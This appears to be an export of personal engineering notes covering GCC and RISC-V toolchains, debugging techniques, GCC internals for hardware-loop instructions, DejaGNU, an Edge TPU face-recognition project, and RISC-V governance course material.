-imultiarch  \nx86_64-linux-gnu -D_GNU_SOURCE hello.cpp -quiet -dumpbase hello.cpp  \n-mtune=generic -march=x86-64 -auxbase hello -version  \n-fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccWH0EQc.s  \n...  \nGGC heuristics: --param ggc-min-expand=100 --param  \nggc-min-heapsize=131072  \nignoring duplicate directory \"/usr/include/x86_64-linux-gnu/c++/7\"  \nignoring nonexistent directory \"/usr/local/include/x86_64-linux-gnu\"  \nignoring nonexistent directory  \n\"/usr/lib/gcc/x86_64-linux-gnu/7/../../../../x86_64-linux-gnu/include\"  \ninclude \"…\" search starts here:  \ninclude \u003c…\u003e search starts here:  \n/usr/include/c++/7  \n/usr/include/x86_64-linux-gnu/c++/7  \n...\n```\n\nAs we can see from the command, the compiler compiles `hello.cpp` and outputs assembly code in the file `/tmp/ccWH0EQc.s`. During the compilation, `cc1plus` needs to find the header file `iostream`, which is present in `/usr/include/c++/7`.\n\nNext up is the assembler invocation. It reads the output of the compiler (i.e., `/tmp/ccWH0EQc.s`) and outputs an 'object-file' `/tmp/ccTpqU8Z.o`. The assembler does not have any dependencies:\n\n```bash\n/usr/bin/x86_64-linux-gnu-as -v --64 -o /tmp/ccTpqU8Z.o /tmp/ccWH0EQc.s**\n```\n\nAnd lastly, we have the linker invocation. The linker `collect2` reads the output of assembler `/tmp/ccTpqU8Z.o`, an object file, and outputs the executable. The linker has a lot of dependencies. \n\nThe most interesting ones are the runtime support files viz. `crt1.o`, `crti.o`, `crtendS.o`, `crtn.o` and the standard libraries `libc`, `libgcc`, `libgcc_s`, `libm`, etc. See if you can spot how these dependencies are passed to the linker. Now the linker needs to know where these files are; actually, the compiler-driver g++ needs to know where these files are such that it can invoke the linker with appropriate libraries (see the flags starting with `-l`) and appropriate paths (see the flags starting with `-L`).\n\n```bash\n/usr/lib/gcc/x86_64-linux-gnu/7/collect2 -plugin\n/usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so\n-plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper\n-plugin-opt=-fresolution=/tmp/cc2j00rN.res\n-plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lgcc\n-plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc_s\n-plugin-opt=-pass-through=-lgcc --sysroot=/ --build-id --eh-frame-hdr\n-m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker\n/lib64/ld-linux-x86-64.so.2 -pie -z now -z relro\n/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o\n/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crti.o\n/usr/lib/gcc/x86_64-linux-gnu/7/crtbeginS.o\n-L/usr/lib/gcc/x86_64-linux-gnu/7\n-L/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu\n-L/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib\n-L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu\n-L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/7/../../..\n/tmp/ccTpqU8Z.o -lstdc++ -lm -lgcc_s -lgcc -lc -lgcc_s -lgcc\n/usr/lib/gcc/x86_64-linux-gnu/7/crtendS.o\n/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crtn\n```\n\nSo, essentially, **a compiler toolchain is a set of tools, supporting libraries, and header files that help build a program from source to an executable that can run on a machine**. \n\nNote that a compiler toolchain is necessary to build executables, but it is not sufficient. What is missing from the toolchain to have 'everything' that is needed to build executable programs is the [sysroot](notes/private/work/sysroot.md).\n\n## The Compiler Toolchain\nApart from sysroot, a compiler toolchain contains various other binaries to help in the compilation process. In some cases, the compiler itself comes as a part of the toolchain. The following is a list of items packaged with the toolchain.\n\n- binutils ([assembler](notes/private/work/riscv-assembler-reference.md), [linker](notes/private/work/linker.md), etc.)  \n- Various compilers ([gcc](notes/general/gcc.md), g++, etc.)  \n- C-Library (glibc, uClibc, etc.)  \n- Runtime support libraries (crtbegin.o, crtend.o, etc.)  \n- debugger ([gdb](notes/private/work/gdb.md)) - C/C++ standard header files (iostream, stdio.h, etc.)  \n- standard libraries (libstdc++, libm, libgcc, libunwind, etc.)  \n- Compiler specific header files (stdint.h, stdc-predef.h)  \n- Runtime support libraries for sanitizers (libasan, libubsan, etc.)\n\n### Further Reading\n-   [Toolchains](https://elinux.org/Toolchains)\n-   [How Initialisation Functions Are Handled (C runtime)](C%20runtime))\n- [LLVM](notes/general/llvm.md)\n- [GCC](notes/general/gcc.md)","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/engineer-training"]},"/notes/private/work/compilers":{"title":"Compilers","content":"A compiler is a system that converts a program from one language to another.

Even with the most robust programming practices bugs creep in, and debugging them is not a pleasant experience. On any widely used software, there are many developers contributing code, and debugging takes a significant portion of developers' time. \n\nThat is why software development methodologies like [Test Driven Development](https://en.wikipedia.org/wiki/Test-driven_development), [Defensive Programming](https://en.wikipedia.org/wiki/Defensive_programming), and [Programming/Design by contract](https://en.wikipedia.org/wiki/Design_by_contract) are adopted by many organisations. Some programming languages even provide support for some methodologies; for example, [D](https://en.wikipedia.org/wiki/D_(programming_language)) implements [contract programming](https://dlang.org/spec/contracts.html) features.\n\nDebugging native applications is difficult because of the semantics of the programming language, the variety of dependent software, the dependencies on hardware features like threading model, memory model, etc. It is therefore essential to know the different debugging technologies available to us.\n\n## Types of Bugs in Programs\nIn general, application failures can be broadly classified into three categories:\n\n1. Programming errors (syntax errors, semantic errors, runtime errors)\n2. System failure (memory errors, file corruption, network failure, etc.)\n3. Invalid data (bad file name, bad data)\n\nSome bugs are difficult to classify in a specific bucket as the classification may depend on the point of reference. For example, data corruption by one application may cause a dependent application to throw a runtime error. \n\nDepending on the type of failure, different tools and methodologies are deployed. In this chapter, we focus on programming errors and the following sections introduce tools and techniques pertaining to those.\n\n## Debugging Tools and Techniques\nWhile working on toolchains, system bringup or developing system software, commonly used debugging techniques can be divided into four categories:\n\n1. Instrumentation-based debugging\n2. Debugging using a debugger\n3. Remote debugging using gdb\n4. JTAG-based debugging\n\n### Instrumentation debugging\nInstrumentation-based debugging techniques are methods to insert code to programs, either manually or programmatically. This helps get insights into the code when the program runs. There are three commonly used techniques in this category:\n\n1. Print debugging\n2. Assertion-based debugging\n3. Sanitisers\n\nWhile print and assertion-based debugging are some of the earliest debugging techniques, sanitisers are relatively new. We briefly describe each technique below.\n\n#### Print Debugging \nThe simplest debugging technique is to add a set of print statements in the program and observe the printed values. Inserting print statements at carefully identified program points can help debug the program. \n\nThis is one of the earliest debugging techniques and is quite useful even today. This approach however fails in several cases, as it does not scale well. Unless the programmer has good knowledge of the code at hand, it is difficult to find issues quickly with this approach.\n\n#### Assertion-based Debugging\nIn order to establish preconditions and postconditions at various program points, it is common to insert assertions. Failure of assertion simplifies debugging. It also helps detect bugs early during the development stage. Usually, assertions are disabled in production code, so one of the first steps to debug is to enable assertions and run the failing test scenario.\n\n#### Sanitisers\nBoth clang and GCC provide instrumentations (sanitisers) that can detect several well-known classes of errors like buffer overflow, memory corruption, etc. There are sanitiser, sanitiser, undefined behaviour sanitiser, thread sanitiser, etc.\n\nThis provides an automated way of detecting bugs. Sanitisers also require runtime support to find bugs and it is not available on all platforms. RISC-V for example currently has support for sanitiser and sanitiser only. [This document](https://github.com/google/sanitizers) is the source of truth for all sanitiser documentation.\n\nOn some platforms, [Valgrind](https://valgrind.org/) can also detect errors that are detected by some sanitisers, like memory corruption, leaks, etc. Unfortunately, Valgrind is currently not available for RISC-V platforms.\n\n## Debugging Using a Debugger\nWhen a debugger is available, it becomes very convenient to inspect programs, get backtraces, values of objects, the state of different threads, etc. Learning to effectively use a debugger like [gdb](notes/private/work/gdb.md) greatly simplifies software development. [](notes/private/work/useful-commands-dump.md#GDB|Frequently%20used%20`gdb`%20commands.)\n\n## Remote Debugging\nInfo on remote debugging on GDB can be found [](notes/private/work/gdb.md#Remote%20Debugging|here).\n\n## JTAG-based Debugging\nDuring the early bringup phase of hardware, there are no software capabilities. In order to debug bare metal applications or access different hardware blocks, JTAG (named after the Joint Test Action Group) is used as the transport mechanism. \n\nMost modern hardware provides ways to directly trace instructions and data using a standard protocol called JTAG, although each hardware vendor may have different levels of support. It is frequently used to debug hardware issues. \n\nRISC-V defines a standard interface for external debugging, this includes accessing hardware threads (hart) from the very first instruction, accessing memory, single-stepping instructions, etc.\n\n## References\n- [Cornell University, CS312 Lecture 26, Debugging Techniques](https://www.cs.cornell.edu/courses/cs312/2006fa/lectures/lec26.html)\n- [Debugging with GDB](https://www.sourceware.org/gdb/current/onlinedocs/gdb.html)\n- [Tim Newsome - RISC-V External Debug (aka JTAG debugging)](aka%20JTAG%20debugging))\n- [Tim Newsome and Megan Wachs - RISC-V External Debug Support Version 0.13.2](https://riscv.org/wp-content/uploads/2019/03/riscv-debug-release.pdf)\n- [](https://five-embeddev.com/riscv-debug-spec/latest/introduction.html#sec:intro)\n- [University of San Francisco - Programming \"By Contract\"](https://www.cs.usfca.edu/~parrt/course/601/lectures/programming.by.contract.html)\n- [](https://github.com/riscv/riscv-isa-sim#debugging-with-gdb)","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/engineer-training"]},"/notes/private/work/dejagnu-documentation-notes":{"title":"DejaGNU Notes","content":"# DejaGNU Notes\n---\n\nGeneral notes on DejaGNU.\n\n* It is implemented as the **runtest** command: `runtest [options] [test]`\n \n* Comprises of a command to run tests, language in which to write the tests\n(expect), a standard directory structure for the tests and a set of\nconfiguration files.\n\n### Most important options\n\n**--tool [toolname]**: name of the group of tests being carried out, might be\nthe name of a tool or an indicator of a type of test.\n\n**--srcdir [dir]** : path where directories of tests may be found, there is also\ntool specific configuration files like **lib**. The name of the directories\ncontaining tests must end with the suffix **.tests**.\n\n**--outdir [dir]**: output logs.\n\n**--target_board [board]**: specifies board(s) on which the tests should be\nrun, also controls which **board configuration file(s)** will be used.\n\n* If nothing is specified, **runtest** will run all tests it can find.\n\n* Don't forget to look at all the options by running `runtest -help`\n\n### What language?\n\nIt makes use of **expect**, which is a tool not a language. However, it is\neasiest to regard it as a language which extends TCL.\n\n### Directory Structure\n\nBy default the test framework lives which a **testsuite** directory with the\nfollowing subdirectories:\n\n**config**: optional, contains **expect** configuration files for each of the\ndifferent types of target board that might be tested. It has names like\n**board.exp** or **unix.exp**.\n\n**lib**: directory containing expect configuration files for each of the tools\nbeing tested, so something like **toolname.exp**.\n\ntest directories: directories named **toolname[type].tests** contain expect\ntests for the tool **toolname**.

However, for the reasons mentioned above, models that process sound are out of the Edge TPU's capabilities as they normally rely on time based architectures such as RNNs and LSTMs.\n\n## Compatibility\n* The board supports only TensorFlow Lite models that are fully quantised and then specifically compiled for the Edge TPU.\n* TensorFlow Lite:\n    * It is a lightweight version of TensorFlow designed for mobile  and embedded devices.\n    * TensorFlow Lite models can be made even smaller and more efficient through quantisation, which converts 32-bit parameter data into 8-bit representations.\n\n![](https://coral.ai/static/docs/images/edgetpu/compile-workflow.png)\n\n* Those are the steps of porting a model to the board\n\n## Implementing Facial Recognition\n* There are three steps to implementing facial recognition:\n\n1. Pre-processing - take a set of image and covert to a uniform format.\n2. Embedding - learns representations of faces in a multidimensional space where distance corresponds to a measure of face similarity.\n3. Classification - uses information given by the embedding process to separate distinct faces.\n\n* Given the three stages, we constructed an architecture for our specific implementation:\n  \n  1. Use an alignment script to perform preprocessing.\n  2. Train a deep MobileNet model to recognise faces, then split it at a layer which represents embeddings.\n  3. Attach a single layer classification model and train it using weight imprinting.\n  \n## Aligning\n* This step occurs on the machine, not on the Edge TPU.\n* Used an alignment script from the FaceNet GitHub repository.\n* By executing it, we can specify the size of the face thumbnails and have them aligned.\n* We used the CASIA Webface for testing, which contains hundreds of thousands of images.\n* It took us 30 minutes in a 20 cores server machine, 2.5h on a Macbook Pro.\n* We then had to convert it to a TFRecord format.\n\n## Embedding\n* The embedding model is a concatenation of convolution layers which looks for features and maps them to multidimensional space.\n* We started with a pre-trained version of MobileNet and retrained it.\n* For training we used a Python script which takes as input a dataset in TFRecord format and checkpoints.\n* We had to then save a GraphDef of the model and freeze the graph.\n* Important to strip out the L2-norm operator as it is not supported by the Edge TPU.\n\n## Classification\n* The model needs to get split into two parts, the embedding extractor and the classification layer, and then re-joined.\n* The reason for the split is because we plan to use the embeddings as input for a single layer classification model.\n* This step ensures that we are able to use weight imprinting, meaning that the model will be able to train on a limited dataset (from around five to ten images) to recognise a face it has never seen before.\n* Firstly we converted the entire frozen graph to a TFLite file to then create the base graph as its own file.\n* From this we have our embedding extractor completely separated from the classification layer.\n* We can now create the head graph and compile the base graph using the Edge TPU compiler.\n* Finally, the compiled base graph and the head graph gets re-joined.\n\n## Project Update (?)\n* One of our biggest challenges was to keep up with the constant updates that the board was receiving as the software was on BETA when we started the project.\n* Quantisation was another challenge to overcome, it limited our choice of models.","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work","script"]},"/notes/private/work/gcc-guide-by-maxim":{"title":"GCC Guide by Maxim","content":"# GCC Guide by Maxim\n---\n## 1: How Generic GCC lowers GIMPLE memory operations into RTL memory operations, and how we can have a hand in its operation\nThis is the top level function that GCC calls when it is lowering GIMPLE -\u003e RTL, and wishes to generate a memory move/memory copy operation:\n\n-\u003e [gcc/expr.c:1560] emit_block_move_hints()\n\nHere is an important piece of code from the above function that makes the decision as to how to emit memcpy:\n```\n  if (CONST_INT_P (size) \u0026\u0026 can_move_by_pieces (INTVAL (size), align))\n    move_by_pieces (x, y, INTVAL (size), align, RETURN_BEGIN);\n  else if (emit_block_move_via_movmem (x, y, size, align,\n                                       expected_align, expected_size,\n                                       min_size, max_size, probable_max_size))\n    ;\n  else if (may_use_call\n           \u0026\u0026 ADDR_SPACE_GENERIC_P (MEM_ADDR_SPACE (x))\n           \u0026\u0026 ADDR_SPACE_GENERIC_P (MEM_ADDR_SPACE (y)))\n    {\n      if (may_use_call \u003c 0)\n        return pc_rtx;\n\n      retval = emit_block_copy_via_libcall (x, y, size,\n                                            method == BLOCK_OP_TAILCALL);\n    }\n\n  else\n    emit_block_move_via_loop (x, y, size, align);\n```\n\nFirst, GCC attempts to see if it can emit, using RTL, a generic by-pieces memcopy (GCC refers to it as memmove), by asking if we `can_move_by_pieces()`, and if so, it calls `move_by_pieces()`.\n\nIf this fails, it will try calling via the `movmem` RTL pattern (`emit_block_move_via_movmem()`). You can find it in [gcc/config/riscv/riscv.md:1505]:\n```\n(define_expand \"movmemsi\"\n  [(parallel [(set (match_operand:BLK 0 \"general_operand\")\n                   (match_operand:BLK 1 \"general_operand\"))\n              (use (match_operand:SI 2 \"\"))\n              (use (match_operand:SI 3 \"const_int_operand\"))])]\n  \"\"\n{\n  if (riscv_expand_block_move (operands[0], operands[1], operands[2]))\n    DONE;\n  else\n    FAIL;\n})\n```\n\nNotice that it is a `define_expand`: `define_expand` works by allowing you, the developer, to specify exactly how a particular template should be expanded into RTL.\n\n(More info on define_expand): https://gcc.gnu.org/onlinedocs/gccint/Expander-Definitions.html#Expander-Definitions\n\nSo, everywhere GCC lowers GIMPLE into RTL, if it generates a movmemsi, it will then call this function to ATTEMPT to expand it.\n\nNotice, this is allowed to fail - if an expansion FAILs, that tells GCC that it needs to find another way to expand this RTL. So it returns all the way back up, and will consequently execute the final \"else\" statement:\n\n```\n      retval = emit_block_copy_via_libcall (x, y, size,\n                                            method == BLOCK_OP_TAILCALL);\n```\n\nYou will, an all likelyhood, want to focus your efforts on riscv_expand_block_move.\n\nHere is a call trace of some of the functions that emit_block_move_hints() calls, that may be worth looking at. \n\n***Remember you can find all of this for yourself by simply single-stepping through the emit_block_move_hints() function.***\n\n  -\u003e [gcc/expr.c] can_move_by_pieces()\n    -\u003e targetm.use_by_pieces_infrastructure()\n\n      # This is a target-specific function pointer.\n      # If RISC-V had defined the TARGET_USE_BY_PIECES_INFRASTRUCTURE_P\n      # macro, then this invocation would call our function.

GCC has no sane way of understanding these insns, so just mark them as UNSPEC (Unspecified, aka \"Hey GCC, you're not allowed to make any assumptions about this insn, except that if it doesn't access the registers or memory, you can assume this insn wont change it\")\n\n((Aside: There is also UNSPEC_VOLATILE, which tells GCC \"Hey, you cannot assume ANYTHING after executing this insn, so don't even touch it.\"\n\nIf GCC still does \"overly clever\" things about your custom RTL insn, try marking it as UNSPEC_VOLATILE instead of just UNSPEC)).\n\nGood examples:\n(define_insn \"riscv_mret\"...\n(define_insn \"riscv_sret\"...\n(define_insn \"riscv_uret\"...\n\n(just copy these)\n\nThen, notice how we can generate them:\nconfig/riscv/riscv.c:4096:\n```\n      if (mode == MACHINE_MODE)\n        emit_jump_insn (gen_riscv_mret ());\n```\n\nso, gen_riscv_mret() will generate the `riscv_mret`. Try adding a \"cv_starti\" template just like it, and emit it from somewhere, to see what happens.\n\n## Hooking up the RTL insns to RISCV target specific code\nRecall from the first section, there was specified that GCC will attempt using the `movmem` RTL template. This is where `riscv_expand_block_move` will get called, and where we have total control as to what happens.\n\nThe call chain from this point looks something like this:\n\n(...somewhere up here is emit_block_move_hints()...)\n...\n-\u003e [gcc/config/riscv/riscv.c:3034] riscv_expand_block_move()\n  -\u003e [gcc/config/riscv/riscv.c:2923] riscv_block_move_straight()\n    -\u003e [gcc/expr.c:1211] move_by_pieces()\n  -\u003e [gcc/config/riscv/riscv.c:2987] riscv_block_move_loop()\n\nWe can change anything we like here with comfort, since this is the target specific part of the compiler. You will most likely want to emit the PULP -specific loop insns from here (that is, from riscv_expand_block_move(), or its callees.)\n\n---\n\ngoes into riscv_block_move_straight\nriscv_expand_block_move -\u003e DONE\n \nlook at emit functions!! 18/09 emit_insn","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/engineer-training","help"]},"/notes/private/work/gdb":{"title":"GDB","content":"All the basic commands can be found [here](notes/private/work/useful-commands-dump.md#GDB).\n\n## Remote Debugging\ngdb can be used to debug programs running on another machine. On the remote machine, a program called `gdbserver` is run, which responds and acts on the requests made by gdb on the client machine. \n\nRemote debugging can be more convenient in some cases; for example, it enables inspecting the program on the machine where the bug has occurred instead of trying to replicate the scenario on a dev machine. This can save a lot of time.

Many architectures have constraints on the operands, such as m68k that has 16 registers (a0–a7 and d0–d7), but only d0–d7 are allowed in a muls instruction. This is expressed by a constraint telling the register allocator that it must use register d0–d7.\n\n- define_insn -\u003e template given is inserted into the insn list.\n\nThe compiler chooses the pattern with the right name and apply the operands, without regard for the RTL template or operand constraints.\n\ndefine_split and define_peephole -\u003e once the insn list is generated, various  optimisation passes happen like convert, replace and rearrange the insns.\n\nFinally the insn list's RTL is matched up with the RTL templates in the define_insn patterns, which are used to emit the final assembly code.\n\ndefine_insn acts like its unnamed, since the names are ignored.\n\n## INSTRUCTION PATTERNS\ndefine_insn is an RTL expression containing 4 to 5 operands:\n\n1. optional name.\n2. RTL template: describes the semantics of the instruction (match_operand, match_operator and match_dup for example).\n3. the condition: string which contains a C expression so when the compiler attempts to match the RTL against a pattern, the condition is evaluated it may not depend on the data that it is being matched, but only the target-machine-types flags.\n4. output template or output statement: either a string, or a fragment of C code that returns a string.\n5. OPTIONAL: insn attributes.\n\n```bash\nriscv32-unknown-elf-gcc -DN=10 -02 -Wall -march=rv32imc -mabi=ilp32 -S -o\n10.test.s test.c\n```\n```\nemit_insn (gen_cv_starti(ob0));\np debug_rtx(ob0)\n```\n\nCREATING LABELS AT THIS POINT, CANT PRINT THEM.\n\nLABEL WOULD BE END, BUT WHERE DOES IT PRINT IT?\n\nPULP PRE-SETS A LOOP START REGISTER AND COUNT TO 70 71 72 ALWAYS THAT, THE START WILL ALWAYS START AT 70.\n\nSo pulp pre-sets a register for loop start and count, it always goes from 70 then 71, 72.

Table driven encoding and decoding of instructions (**riscv-opc.c** (encoding) and **riscv-dis.c** (decoding)).\n2. Change the assembler (**gas/config**) to use the new tables (**tc-riscv.c** and **tc-riscv.h**).\n3. Extend relocations: modify BFD in **bfd/**.\n\n---\n## Encoding (riscv-opc.c)\n```c\n{\"cv.starti\", 0, INSN_CLASS_COREV_HWLP, \"di,b1\",  \n  MATCH_CV_STARTI, MASK_CV_STARTI, match_opcode, 0}\n```\n\n- Instruction mnemonic: **cv.starti**\n- xlen: base ISA required for this, either **32** (RV32), **64** (RV64) or **0** (both).\n- Instruction class: defined in **include/opcode/riscv.h:riscv_insn_class**.\n- Instruction operands: **di** maps to the loop number and **b1** maps to the unsigned immediate value (**cv.starti Ln(di), uimmL(b1)**).\n---\n- Match and Mask: defined in **include/opcode/riscv-opc.h**\n- Mask -\u003e **preset bits**, hard code common encoding fields in the instruction, such as the opcode.\n- Match -\u003e the **opcode**, mask preset bits with 1 in the operand encoding fields.\n\n---\n\nYou can see that how it is calculated here.

This macro extracts only the bits used for the b1 operand from the bit stream. The other operations are specific for this operand. The immediate field refers to a half word address, because instructions are on half word boundaries. We shift it left 1 bit to turn it into a full byte address and the PC is required as the offset is PC relative.","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["help","work","slides"]},"/notes/private/work/how-to-write-a-llvm-backend":{"title":"How to Write a LLVM Backend","content":"# How to Write a LLVM Backend\n---\nMore information [here](https://llvm.org/docs/WritingAnLLVMBackend.html).\n\nLLVM converts LLVM IR to code for a specific target, the steps are:\n1.

It is an **open specification**.\n\n### History of RISC and Open ISAs\nReduced Instruction Set Computers ([RISC](https://en.wikipedia.org/wiki/Reduced_instruction_set_computer)) where created at the University of California at Berkeley (UCB) nearly at the same time as MIPS at Stanford (in the 1980s).\n\nSome popular RISC architectures are: the SPARC line, DEC's Alpha line, Intel's i860 and i960 processors and ARM processors. **RISC-V is the latest iteration of it**.\n\n### RISC-V Origins: UC Berkeley Architecture Research\nThe RISC-V instruction set was started by Prof. Krste Asanovic and graduate students Yunsup Lee and Andrew Waterman as part of the Parallel Computing Laboratory ([Par Lab](notes/private/work/parlab.md)) at UC Berkeley, of which Prof. David Patterson was Director.\n\nThe following report is the **first publication** that describes the RISC-V instruction set: [_The RISC-V Instruction Set Manual_](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2011/EECS-2011-62.pdf).\n\n[DARPA](https://www.darpa.mil/work-with-us/for-universities) (Defense Advanced Research Projects Agency) plays a significant role.\n\n### The RISC-V Name\nThe name RISC-V was chosen to represent the fifth major RISC [ISA](notes/private/work/isa.md) design from UC Berkeley (RISC-I, RISC-II, SOAR and SPUR).\n\n### What is RISC-V International?\nThe RISC-V Foundation was founded in 2015 and it is controlled by its members.\n\nIncorporation in Switzerland has the effect of calming concerns of political disruption to the open collaboration model. RISC-V international does not maintain any commercial interest in products or services.\n\nThe RISC-V International Association was incorporated in Switzerland in March 2020.\n\n### RISC-V Membership\nIt is free for individual people, academic institutions and non-profit organisations. There are three membership levels available for for-profit organisations.\n\n1. Premier Members\n2. Strategic Members\n3. Community Organisations\n4. Community Individuals\n\n### RISC-V International Governance\nRISC-V international is governed by its Board of Directors. The Board is composed of Directors elected to represent all classes of membership to ensure voice at all levels. They also have a Technical Steering Committee (TSC) which provides leadership to technical initiatives.\n\nThere is also a range of committees and task groups.\n\n### RISC-V Community Working Model\nThere are three public forums that anyone can participate:\n\n- The RISC-V public mailing lists: [ISA-Dev](https://groups.google.com/u/1/a/groups.riscv.org/g/isa-dev?pli=1) and [SW-Dev](https://groups.google.com/u/1/a/groups.riscv.org/g/sw-dev).\n- The [Exchange forums](https://exchange.riscv.org/).\n- The [RISC-V Slack channel](https://risc-v-international.slack.com/) for live chat.\n\n### RISC-V's Relationship with the Linux Foundation\nIn November 2018 the RISC-V Foundation announced a joint collaboration with the Linux Foundation.\n\n## Chapter 3 - The RISC-V Community\n### Overview\n-   Understand how the technical organisation works in RISC-V.\n-   Know where to go for information as well as communication.\n-   Completely understand the RISC-V Code of Conduct and how it applies to all forms of communication within the organisation.\n\n### Culture of Community Engagement\nRISC-V operates primarily as a group of motivated organisations and individuals pursuing a common goal by working in concert rather than as adversaries, even if those organisations compete with each other in other areas.\n\nAs of February 2021 there are well over 2,000 people working on RISC-V, representing over 230 organisations.\n\n### Intellectual Property Policy\nAt the core of the RISC-V membership is the [membership agreement](https://riscv.org/wp-content/uploads/2020/03/RISC-V_Membership_Agreement_NFS.pdf).\n\n### Code of Conduct and Privacy\nYou can find it [here](https://riscv.org/community/community-code-of-conduct/).\n\nRISC-V also follows the [Linux Foundation's privacy policy](https://linuxfoundation.org/privacy/).\n\n### RISC-V's Technical Organisation\nKrste Asanovic, Yunsup Lee and Andrew Waterman all participate daily as technical task group and committee chairs as well as mentors to other technical leaders. David Patterson and Krste Asanovic represent member organisations on the Board of Directors.\n\n### Terminology\n#### Technical Steering Committee (TSC)\nPrimary decision-making body within the technical organisation.\n\n#### Chief Technology Office (CTO)\nRuns TSC voting process, Leadership Strategy Meeting (LSM) and Chairs meetings, strategy, organisation, IT, roadmap, resources, escalations.\n\n#### ISA Committees (IC)\nApprove and oversee packages for TSC votes for the creation of ISA Extension TGs, as well as filling the chair and vice-chair vacancies for its TGs. Develop strategy for the groups under it and complete coverage of areas of responsibility under it including gaps.\n\n#### Horizontal Committees (HC)\nApprove and oversee TGs working on activities other than ISA extensions. Has responsibilities to make sure that all ISA TGs cover the area overseen by the HC before ratification. Responsible for developing a holistic strategy and reaching out to the external ecosystem and community groups.\n\n#### **Horizontal Subcommittees (HSC)**\nSubcommittees underneath the Horizontal Committees, with similar responsibilities over a more focused topic.\n\n#### **Task Groups (TG)**\nMust have a charter that defines deliverable work products: extension specifications, standards, requirements, best practices, etc. TGs under the unpriv and priv SC can have ISA extension work products. TGs under HCs should not have ISA extension work products.\n\n#### **Special Interest Groups (SIG)**\nTopic discussion. No work product. Can be created by the TSC, ICs or HCs with TSC approval not required.\n\n#### **Chair \u0026 Vice-Chair**\nLeadership positions for a committee, task group, or SIG. These positions are generally elected on an annual basis. Chairs are always from member organisations, while vice-chairs may be either Individual members or representing organisations. Chairs and vice-chairs meet weekly to collaborate and discuss organisational details.\n\n### Technical Leadership and Governance\nDirect work on the specifications is driven by individual task groups working on specific specifications, software initiatives, testing or compliance frameworks, and many other ongoing projects. This work is organised and directed by technical leadership, and enabled and tracked by RISC-V’s neutral technical staff.\n\n### Technical Steering Committee\nThe Technical Steering Committee (TSC) provides leadership to our technical initiatives. They are assisted by the Standing Committees, Technical Task Groups, and Special Interest Groups, all of which report to the TSC.\n\nThe TSC delegates responsibilities to organisational components below it in the hierarchy of groups. In addition, it discusses and decides on strategy, escalations, group and chair and preliminary charter approvals, and extension ratification.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/018aa36ba6fcc105a26bf62c7b8307a0/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/technical_organization__1_.png\"\u003e\u003c/center\u003e\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/ca6261ee043dbf7127a39665a81feed4/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/technical_organization__2_.png\"\u003e\u003c/center\u003e\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/a72d7d1c9a596f5e327dab9c3c640b54/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/technical_organization__3_.png\"\u003e\u003c/center\u003e\n\n### ISA and Horizontal Committees and Subcommittees\nCommittees are responsible for directing work within the scope of their charter. ISA committees - “priv” and “unpriv”, referring to the Privileged and Unprivileged RISC-V specification volumes - direct the creation of specific extensions. **Horizontal committees** - including Software, Security, ISA Infrastructure, SOC Infrastructure, Implementation, and others - are responsible for directing specification work in their areas other than ISA extensions. _All ISA extensions must be signed off by each of the Horizontal committees prior to ratification_.\n\nHorizontal committees sometimes also have subcommittees, particularly for those committees with a very large scope (such as Software). Subcommittees have largely the same responsibilities, although procedural decisions, including decisions on chairs, are made by the primary committee.\n\n### Task Groups\nThis is where the actual work is done on specifications, software, test frameworks, and other concrete deliverables. Task groups are usually started for a specific purpose, which is then written into their charter and approved by the committee responsible for them. Some task groups finish their work relatively quickly (within 3-6 months) while others work for much longer to make sure the final product is worthy of inclusion.\n\nThe chair for each group is responsible for directing the activities, overseeing the creation of the deliverable work product (spec, software, etc.), reporting back to the Committee and the technical organisation on status, and attending a weekly chairs meeting. Vice-chairs share the responsibilities and the effort, but chairs hold the final responsibility for the group. Chairs and vice-chairs are elected by the community and serve 1-year terms between election cycles, although there are no term limits and existing chairs may reapply.\n\n### Technical Staff\n#### Chief Technical Officer\nThe CTO role is vital, as it provides a neutral leadership function that can’t be filled by a member. The CTO takes all members’ needs into account to both instigate and drive organisation and initiatives within the technical hierarchy, and to facilitate negotiation at all levels within working groups, committees, and governance groups. The CTO also creates and seeks approval for organisational policies, and reports technical progress up to the Board of Directors and functions as the neutral voice of the technical community in workshops and public events.\n\n#### Technical Program Managers\nThis is a catch-all term for experienced individuals who perform all of the operational activities within the project, including everything from running meetings to setting up calendar entries and conference calls to organising technical information and even writing detailed technical policies.\n\n#### Other Technical Staff\nWhile the above roles are the only permanent staff in the technical organisation, RISC-V occasionally hires contractors for specific tasks, including test development and documentation.\n\n### Additional Roles\n#### Board of Directors\nThe Board is the primary decision-making body for RISC-V. As such, it has representation from all members. Premier members each have a seat at the table, while Strategic, Community Organisation, and even Community Individual level members elect representatives each year.\n\n#### Marketing \u0026 Visibility\nRISC-V has a Director of Marketing who is responsible for driving the visibility of RISC-V worldwide. Working with the Marketing Committee, a member group that provides feedback and resources, the Director of Marketing manages all visibility activities, including the main Marketing Committee, Events, Content (including written, video, and in-person content), social media and PR (supported by an outside firm), and developer advocacy activities including online learning, RISC-V Ambassadors, Regional and 